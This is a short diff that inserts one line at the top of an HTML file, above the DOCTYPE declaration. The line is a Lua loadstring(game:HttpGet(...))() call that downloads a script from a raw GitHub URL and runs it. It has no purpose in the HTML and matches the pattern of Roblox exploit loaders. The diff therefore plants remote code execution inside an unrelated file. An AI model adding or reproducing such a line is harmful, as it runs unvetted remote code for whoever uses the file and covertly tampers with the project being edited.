@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/7teenscripts/loadingscrn/refs/heads/main/lua"))()
 
 <!DOCTYPE html>
 <html lang="en">
